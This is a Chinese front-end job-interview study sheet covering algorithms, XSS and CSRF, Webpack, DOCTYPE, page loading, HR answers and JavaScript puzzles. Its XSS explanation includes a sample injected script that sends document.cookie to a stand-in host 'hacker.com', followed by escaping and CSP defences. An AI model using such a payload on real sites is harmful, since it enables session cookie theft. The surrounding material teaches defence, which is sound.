
#### 算法押题  
1. 排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）
    1. 快速排序  http://segmentfault.com/a/1190000009426421
    2. 选择排序  http://segmentfault.com/a/1190000009366805
    3. 希尔排序  http://segmentfault.com/a/1190000009461832
    4. 冒泡排序
2. 二分查找法
3. 递归
    -  http://segmentfault.com/a/1190000009857470
4. 堆栈***，队列，链表
    - http://juejin.im/entry/58759e79128fe1006b48cdfd
   
    
#### 安全押题

1. 什么是 XSS 攻击？如何预防？
    - 跨域脚本攻击,cross-site scripting
    - 核心：向页面注入脚本(js)
    
    ```
    div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
// 恶意就被执行了，这就是 XSS
    ```
    - 预防
        - 不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行
        - 如果你一样要用 innerHTML，字符过滤
            - 把 < 替换成 &lt;
            - 把 > 替换成 &gt;
            - 把 & 替换成 &amp;
            - 把 ’ 替换成 &#39;
            - 把 ’ 替换成 &quot;
            - 代码 div.innerHTML = userComment.replace(/>/g, ‘&lt;’).replace…
        - 使用 CSP Content Security Policy


2. 什么是 CSRF 攻击？如何预防？
    - 跨站请求伪造,Cross-site Request Forgery
    - 过程:
        - 用户在注册网站A登陆过，网站A给用户下发cookie
        - 该用户又访问了网站B，网站B有诱导链接，用户点击后，访问到了网站A，浏览器自动上传cookie，网站A对身份验证后发现是正确的，然后允许登录，网站B对网站A进行攻击
        - 关键：用户在注册网站A登陆过
        - 网站中某个接口存在漏洞
    - 防御措施
        - Referer验证：页面来源
        - Token验证：登录时，向用户本地存放一个Token，用于下次登录的验证

3. XSS和CSRF区别
    - XSS : 向页面注入js，运行js，做一些事情
    - CSRF: 
        - 依赖于用户登录网站
        - 利用本身的漏洞，去帮你自动执行接口


#### Webpack 题
1. 转译出的文件过大怎么办？
    - 使用 code split
    - 写法  import(‘xxx’).then(xxx=>{console.log(xxx)})
    - xxx 模块就是按需加载的

2. 转译速度慢什么办？
    - webpack 慢 怎么办，搜一下
3. 写过 webpack loader 吗？[参考](http://www.alloyteam.com/2016/01/webpack-loader-1/)

#### 发散题
1. 什么是DOCTYPE及作用
    1. DTD(document type definition,文档类型定义)是一系列语法规则，用来定义XML和HTML的文件类型，浏览器使用它来判断文档类型，决定使用何种协议解析，以及切换浏览器模式。
        - 一句话：DTD告诉浏览器我是什么文档类型，浏览器根据这个来判断我用什么引擎来解析它，渲染它
    2. DOCTYPE是用来声明文档类型和DTD规范的，一个主要用途就是文件合法性的验证，如果文件代码不合法，那么浏览器解析时就会出一些差错。
        - 直接告诉浏览器什么是DTD
    3. 常见的DOCTYPE有哪些
        - HTML5   <!DOCTYPE html>
        - 4.0版本
            - 严格模式：该DTD包含所有的HTML元素和属性，但不包含展示性和弃用的元素（比如font）
            - 宽松模式：该DTD包含所有的HTML元素和属性，包含展示性和弃用的元素（比如font）

2. 从输入 URL 到页面展现中间发生了什么？
    - DNS 查询 DNS 缓存
    - 建立 TCP 连接（三次握手）连接复用
    - 发送 HTTP 请求（请求的四部分）
    - 后台处理请求
        - 监听 80 端口
        - 路由
        - 渲染 HTML 模板
        - 生成响应
    - 发送 HTTP 响应
    - 关闭 TCP 连接（四次挥手）
    - 解析 HTML
    - 下载 CSS（缓存
    - 解析 CSS
    - 下载 JS（缓存
    - 解析 JS
    - 下载图片
    - 解析图片
    - 渲染 DOM 树
    - 渲染样式树
    - 执行 JS

3. 你没有工作经历吗？
    - 一开始就问，可以拜拜。
    - 中间问最后问，他想压价。
    - 解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。

4. 你遇到过最难的问题是什么？
    - [参考](https://www.zhihu.com/question/35323603/answer/338796153)
5. 你的期望薪资是多少？ 你想要的工资 加 1000~2000。
6. 任何你不会的问题
    - 承认不会
    - 询问详细细节：你问的是不是XXX方面的知识？请问你想问的是哪方面知识？
    - 根据面试官的回答，向有利于自己的方向引导话题。


#### 刁钻代码题
1. map加parseInt
    
    ```
    [1,2,3].map(parseInt)
    parseInt(1,0, array) // 1
    parseInt(2,1, array) // NaN
    parseInt(3,2, array) // NaN
    ```

2. a.x = a = {}
    
    ```
    var a = {n:1};
    var b = a;
    a.x = a = {n:2};
    
    问 a.x 是多少？ // undefined a.x是之前的a，现在的a.x不存在
    ```
3. (a == 1 && a== 2 && a==3) 可能为 true 吗？
    
    ```
    a = {
      value: 0,
      toString(){
        a.value += 1
        return a.value 
      }
    }
    ```

### 学习网站
1. stack Overflow
2. 掘金
3. 谷歌
4. CNode社区
5. 知乎

